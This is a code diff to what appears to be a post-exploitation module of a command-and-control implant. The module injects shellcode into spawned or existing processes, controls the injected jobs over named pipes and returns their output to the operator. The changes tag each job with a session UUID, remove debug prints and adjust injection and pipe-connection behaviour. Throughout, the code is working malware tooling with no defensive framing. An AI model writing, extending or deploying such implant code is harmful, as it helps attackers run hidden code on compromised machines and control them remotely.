@@ -88,6 +88,8 @@ typedef struct _POSTEX_OBJECT {
     UINT8  failures;
     UINT8  connected;
     UINT8  need_free;
+
+    PCHAR uuid;
 } POSTEX_OBJECT, *PPOSTEX_OBJECT;
 
 typedef struct _POSTEX_LIST {
@@ -108,7 +110,7 @@ namespace postex {
     auto inject_explicit( _In_ UINT32 pid, _In_ PBYTE shellcode, _In_ INT32 size, _In_ POSTEX_OBJECT* obj ) -> ERROR_CODE;
     auto inject_inline( _In_ PBYTE shellcode, _In_ INT32 size, _In_ POSTEX_OBJECT* obj ) -> ERROR_CODE;
 
-    auto create( _In_ WCHAR* prefix_pipe, _In_ ULONG method, _In_ ULONG id ) -> POSTEX_OBJECT*;
+    auto create( _In_ PCHAR prefix_pipe, _In_ ULONG method, _In_ ULONG id ) -> POSTEX_OBJECT*;
     auto add( _In_ POSTEX_OBJECT* obj ) -> void;
     auto rm( _In_ POSTEX_OBJECT* obj ) -> void;
 
@@ -229,11 +231,12 @@ auto postex::memory_free(
 }
 
 auto postex::cleanup( POSTEX_OBJECT* obj ) -> void {
-    postex::pipe_disconnect(  obj );
+    postex::pipe_disconnect( obj );
     postex::memory_free( obj );
 
     if ( obj->thread_handle  ) { CloseHandle( obj->thread_handle  ); obj->thread_handle  = nullptr; }
     if ( obj->process_handle ) { CloseHandle( obj->process_handle ); obj->process_handle = nullptr; }
+    if ( obj->uuid ) { free( obj->uuid ); obj->uuid = nullptr; }
 }
 
 auto postex::destroy( 
@@ -245,9 +248,9 @@ auto postex::destroy(
 }
 
 auto postex::create( 
-    _In_ WCHAR* prefix_pipe,
-    _In_ ULONG  method, 
-    _In_ ULONG  id 
+    _In_ PCHAR prefix_pipe,
+    _In_ ULONG method, 
+    _In_ ULONG id 
 ) -> POSTEX_OBJECT* {
     POSTEX_OBJECT* obj = (POSTEX_OBJECT*)malloc( sizeof(POSTEX_OBJECT) );
     if ( ! obj ) return nullptr;
@@ -321,8 +324,6 @@ auto postex::pipe_read(
     DWORD bytes_read = 0;
     PBYTE buffer     = nullptr;
 
-    DbgPrint("[postex_poll] reading\n");
-
     if ( ! PeekNamedPipe( obj->pipe, nullptr, 0, nullptr, &available, nullptr ) ) {
         obj->failures++;
         if ( obj->failures >= POSTEX_MAX_FAILURES ) {
@@ -330,8 +331,6 @@ auto postex::pipe_read(
         }
         return;
     }
-
-    DbgPrint("[postex_poll] available bytes: %d\n", available);
 
     if ( available == 0 ) return;
 
@@ -342,14 +341,11 @@ auto postex::pipe_read(
         free( buffer ); obj->failures++; return;
     }
 
-    DbgPrint("[postex_poll] read: %d\n", bytes_read);
-    DbgPrint("[postex_poll] read: %s\n", buffer);
-
     obj->failures = 0;
 
     if ( bytes_read && *((ULONG*)buffer) != obj->id ) {
-        BeaconPkgInt32( MSG_RAW );
-        BeaconPkgBytes( buffer, bytes_read );
+        BeaconPkgInt32( MSG_RAW, obj->uuid );
+        BeaconPkgBytes( buffer, bytes_read, obj->uuid );
     } else if ( bytes_read >= sizeof(PIPE_MSG) ) {
         PPIPE_MSG msg = (PPIPE_MSG)buffer;
 
@@ -358,7 +354,7 @@ auto postex::pipe_read(
                 obj->need_free = TRUE;
             }
 
-            BeaconPkgInt32( msg->type );
+            BeaconPkgInt32( msg->type, obj->uuid );
 
             switch ( msg->type ) {
                 case MSG_READY:
@@ -368,7 +364,7 @@ auto postex::pipe_read(
                 case MSG_OUTPUT:
                     if ( bytes_read > sizeof(PIPE_MSG) ) {
                         BeaconPkgInt32( msg->exit_code );
-                        BeaconPkgBytes( (buffer + sizeof(PIPE_MSG)), bytes_read - sizeof(PIPE_MSG) );
+                        BeaconPkgBytes( (buffer + sizeof(PIPE_MSG)), bytes_read - sizeof(PIPE_MSG), obj->uuid );
                     }
                     break;
 
@@ -378,7 +374,7 @@ auto postex::pipe_read(
 
                 case MSG_END:
                     obj->state = STATE_COMPLETED;
-                    BeaconPkgInt32( msg->exit_code );
+                    BeaconPkgInt32( msg->exit_code, obj->uuid );
                     break;
             }
 
@@ -420,7 +416,7 @@ auto postex::checkalive( PPOSTEX_OBJECT obj ) -> void {
 
 auto postex::poll( void ) -> ULONG {
     POSTEX_LIST* list = postex::listget();
-    
+
     POSTEX_OBJECT* obj = list->head;
     while ( obj ) {
         POSTEX_OBJECT* next = obj->next;
@@ -447,17 +443,14 @@ auto postex::poll( void ) -> ULONG {
     return list->count;
 }
 
-// ==================== INJECTION ====================
-
 auto postex::inject_spawn(
     _In_ PBYTE          shellcode, 
     _In_ INT32          size, 
     _In_ POSTEX_OBJECT* obj
 ) -> ERROR_CODE {
-    PS_CREATE_ARGS      args    = { .state = CREATE_SUSPENDED };
     PROCESS_INFORMATION ps_info = {};
 
-    ERROR_CODE code = SpawnInjection( shellcode, size, nullptr, &args );
+    ERROR_CODE code = SpawnInjection( shellcode, size, nullptr );
     
     if ( code == ERROR_SUCCESS ) {
         obj->process_handle = ps_info.hProcess;
@@ -472,7 +465,7 @@ auto postex::inject_explicit(
 ) -> ERROR_CODE {
     PROCESS_INFORMATION ps_info = {};
 
-    ERROR_CODE code = ExplicitInjection( pid, FALSE, shellcode, size, nullptr, &ps_info );
+    ERROR_CODE code = ExplicitInjection( pid, TRUE, shellcode, size, nullptr, &ps_info );
 
     obj->process_handle = ps_info.hProcess;
     obj->thread_handle  = ps_info.hThread;
@@ -524,25 +517,23 @@ extern "C" auto go_inject( char* args, int argc ) -> BOOL {
     BeaconInformation( &info );
 
     ULONG seed = GetTickCount();
-    postex_id = RtlRandomEx( &seed );
-
-    DbgPrint( "postex id: %x\n", postex_id );
-
-    DbgPrint("pipe: %s\n", info.Config->Postex.ForkPipe);
+    postex_id  = RtlRandomEx( &seed );
 
     POSTEX_OBJECT* obj = postex::create( info.Config->Postex.ForkPipe, method, postex_id );
     if ( ! obj ) {
         return FALSE;
     }
 
+    obj->uuid = (PCHAR)malloc( 36 );
+    memcpy( obj->uuid, info.Config->Postex.CurrentUUID, 36 );
+
     // Calculate sizes dynamically
-    // ULONG pipename_len = wcslen( info.Config->Postex.ForkPipe ) * sizeof(WCHAR);
     ULONG pipename_len = strlen( (PCHAR)obj->pipename ) * sizeof(CHAR) + 1;
     
     // Calculate header size based on struct layout
     ULONG header_size = offsetof(POSTEX_HEADER, pipename) +   // Fixed fields up to pipename
                         sizeof(ULONG) +                       // pipename_len field
-                        pipename_len +                        // pipename buffer
+                        pipename_len  +                       // pipename buffer
                         sizeof(ULONG) +                       // argc field
                         arglen;                               // args buffer
 
@@ -614,14 +605,19 @@ extern "C" auto go_inject( char* args, int argc ) -> BOOL {
             break;
     }
 
-    DbgPrint("failed: %X\n", ok);
-
     // Free the allocated buffer
     VirtualFree( full_content, 0, MEM_RELEASE );
 
     if ( ! ok ) {
-        DbgPrint("success: %X\n", ok);
         postex::add( obj );
+
+        WaitForSingleObject( nt_current_process(), 500 );
+
+        if ( ! obj->connected ) {
+            if ( postex::pipe_connect( obj, 500 ) ) {
+                obj->connected = TRUE;
+            }
+        }
     } else {
         postex::cleanup( obj );
         free( obj );
@@ -658,9 +654,9 @@ extern "C" void go_suspend( char* args, int argc ) {
     }
 
     if ( postex::pipe_send( obj, CMD_SUSPEND ) ) {
-        BeaconPkgInt32( 0 );
+        BeaconPkgInt32( 0, obj->uuid );
     } else {
-        BeaconPkgInt32( 0 );
+        BeaconPkgInt32( 0, obj->uuid );
     }
 }
 
@@ -677,14 +673,12 @@ extern "C" void go_resume(char* args, int argc) {
     }
 
     auto code = postex::pipe_send( obj, CMD_RESUME );
-    BeaconPkgInt32( code );
+    BeaconPkgInt32( code, obj->uuid );
 }
 
 extern "C" void go_kill( char* args, int argc ) {
     datap parser = {};
-
     BeaconDataParse( &parser, args, argc );
-
     ULONG id = BeaconDataInt(&parser);
 
     POSTEX_OBJECT* obj = postex::find( id );
@@ -694,9 +688,14 @@ extern "C" void go_kill( char* args, int argc ) {
 
     postex::pipe_send( obj, CMD_KILL );
 
+    PCHAR uuid_copy = obj->uuid;
+    obj->uuid = nullptr;
+
     postex::destroy( obj );
 
-    BeaconPkgInt32( TRUE );
+    BeaconPkgInt32( TRUE, uuid_copy );
+
+    if ( uuid_copy ) free( uuid_copy );
 }
 
 extern "C" void go_list( char* args, int argc ) {
